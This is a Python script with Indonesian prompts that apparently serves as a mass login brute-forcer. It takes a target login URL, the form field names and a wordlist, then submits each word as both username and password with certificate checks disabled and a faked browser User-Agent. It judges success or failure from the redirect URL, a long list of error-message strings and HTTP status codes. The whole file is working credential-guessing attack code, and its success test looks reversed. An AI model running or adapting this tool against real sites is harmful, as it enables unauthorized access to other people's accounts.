import signal
import os
import time
import requests
import urllib3
import datetime
from alive_progress import alive_bar
from colorama import Fore, Back, Style, init

init()


Tanggal = datetime.datetime.now()
file_name = Tanggal.strftime("%d%b%Y_%H%M%S")   

def handler(signum, frame):
    res = input(" Ctrl-c was pressed. Do you really want to exit? y/n ")
    if res == 'y':
        exit(1)
 
signal.signal(signal.SIGINT, handler)

def bruteV1():

    link_target = input(str(Fore.YELLOW + "Masukan Link Target Form Login   : "+ Style.RESET_ALL))
    Parameter1 = input(str(Fore.YELLOW +"Masukan Parameter user             : "+ Style.RESET_ALL))
    Parameter2 = input(str(Fore.YELLOW +"Masukan Parameter pass             : "+ Style.RESET_ALL))
    path1 = input(str(Fore.YELLOW +"Masukan Path Wordlist Username&password : "+ Style.RESET_ALL))
    print("\n########### Login Mass Berjalan ###########" , Style.RESET_ALL)
    print("\n")
    with open (path1, "r",encoding = "utf8") as myFile1:
        data = myFile1.readlines()

    headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'
    }

    jumlah = sum(1 for _ in data)

    with alive_bar(jumlah, force_tty=True,bar='classic' , spinner='classic') as Bar:
        for i in range(0,len(data)):
            u = data[i].rstrip('\n')
            try:
                urllib3.disable_warnings()
                data_dict = {Parameter1:u,Parameter2:u}
                req = requests.post(link_target, verify = False, headers = headers, data=data_dict, allow_redirects=True)
                status = int(req.status_code)
                validasi = link_target != req.url
                if(validasi == False):
                    print(Fore.GREEN +"[SUCCESS]",   Fore.YELLOW + "Website :", Style.RESET_ALL,req.url,Fore.YELLOW +"Username : ", Style.RESET_ALL,u,Fore.YELLOW +"Password : ",Style.RESET_ALL,u, Fore.GREEN + "Login Berhasil" + Style.RESET_ALL,status)
                elif('Username tidak ditemukan' in str(req.content) or 'Kata Sandi tidak tepat!' in str(req.content) or 'username' in str(req.content) or 'Account anda belum terdaftar.' in str(req.content) or 'Account' in str(req.content) or 'credentials' in str(req.content) or 'Invalid username and/or password...' in str(req.content) or 'Invalid' in str(req.content) or 'Username' in str(req.content) or 'Gagal!' in str(req.content) or 'Email atau Password salah' in str(req.content) or 'salah' in str(req.content) or 'Username atau Password belum terdaftar' in str(req.content) or 'Username' in str(req.content) or 'Gagal ' in str(req.content) or 'failed!' in str(req.content) or 'User'  in str(req.content) or  'Nama' in str(req.content) or 'Telah terjadi error:' in str(req.content) or 'Email harus berupa alamat surel yang valid.' in str(req.content) or 'error' in str(req.content) or 'Telah' in str(req.content) or 'Email' in str(req.content) or 'Identitas tersebut tidak cocok dengan data kami.' in str(req.content) or 'tidak' in str(req.content) or 'aktif ' in str(req.content) or 'Acount' in str(req.content) or 'Email' in str(req.content) or 'The Email field must contain a valid email address.' in str(req.content) or 'Incorrect username or password.' in str(req.content) or 'Incorrect' in str(req.content) or 'salah' in str(req.content) or  'Username atau Password salah' in str(req.content) or 'Username tidak ditemukan' in str(req.content) or 'Password yang anda masukan salah' in str(req.content) or 'Username atau Password Salah' in str(req.content) or 'Username Salah' in str(req.content) or 'Password Salah' in str(req.content) or 'Username Belum Terdaftar' in str(req.content)):
                    print(Fore.GREEN +"[INFO]",Fore.YELLOW + "Website :", Style.RESET_ALL,req.url,Fore.YELLOW +"Username : ", Style.RESET_ALL,u,Fore.YELLOW +"Password : ", Style.RESET_ALL,u,Fore.RED + "Login Gagal" + Style.RESET_ALL,status)
                elif(int(status) == 302):
                    print(Fore.GREEN +"[INFO]",Fore.YELLOW + "Website :", Style.RESET_ALL,req.url,Fore.YELLOW +"Username : ", Style.RESET_ALL,u,Fore.YELLOW +"Password : ", Style.RESET_ALL,u,Fore.RED + "Login Gagal" + Style.RESET_ALL,status)                   
                elif(int(status) == 419):
                    print(Fore.GREEN +"[INFO]",Fore.YELLOW + "Website :", Style.RESET_ALL,req.url,Fore.YELLOW +"Username : ", Style.RESET_ALL,u,Fore.YELLOW +"Password : ", Style.RESET_ALL,u,Fore.RED + "Login Gagal" + Style.RESET_ALL,status)                   
                elif(int(status) == 401):
                    print(Fore.GREEN +"[INFO]",Fore.YELLOW + "Website :", Style.RESET_ALL,req.url,Fore.YELLOW +"Username : ", Style.RESET_ALL,u,Fore.YELLOW +"Password : ", Style.RESET_ALL,u,Fore.RED + "Login Gagal" + Style.RESET_ALL,status)
                elif(int(status) == 403):
                    print(Fore.GREEN +"[INFO]",Fore.YELLOW + "Website :", Style.RESET_ALL,req.url,Fore.YELLOW +"Username : ", Style.RESET_ALL,u,Fore.YELLOW +"Password : ", Style.RESET_ALL,u,Fore.RED + "Login Gagal" + Style.RESET_ALL,status)                             
                elif(int(status) == 303):
                    print(Fore.GREEN +"[INFO]",Fore.YELLOW + "Website :", Style.RESET_ALL,req.url,Fore.YELLOW +"Username : ", Style.RESET_ALL,u,Fore.YELLOW +"Password : ", Style.RESET_ALL,u,Fore.RED + "Login Gagal" + Style.RESET_ALL,status)
                elif(int(status) == 500):
                    print(Fore.GREEN +"[INFO]",Fore.YELLOW + "Website :", Style.RESET_ALL,req.url,Fore.YELLOW +"Username : ", Style.RESET_ALL,u,Fore.YELLOW +"Password : ", Style.RESET_ALL,u,Fore.RED + "Login Gagal" + Style.RESET_ALL,status)   
                #else:
                #    print(Fore.GREEN +"[SUCCESS]",   Fore.YELLOW + "Website :", Style.RESET_ALL,req.url,Fore.YELLOW +"Username : ", Style.RESET_ALL,u,Fore.YELLOW +"Password : ",Style.RESET_ALL,u, Fore.GREEN + "Login Berhasil" + Style.RESET_ALL,status)
                #link = req.url
                #simpan_log = "Username {} Password {} Website {}\n".format(u,u,link)
                #log = open("./log/bruteV1/{}.txt".format(file_name),'a')
                #log.write(str(simpan_log))
            except requests.exceptions.RequestException as e:
                print(e)
            Bar()
    print(Fore.YELLOW +  "#############################################")
    print("Login Masal Selesai")
    print("Log Tersimpan Pada Folder log Dengan Nama {}.txt".format(file_name+ Style.RESET_ALL),Fore.RED)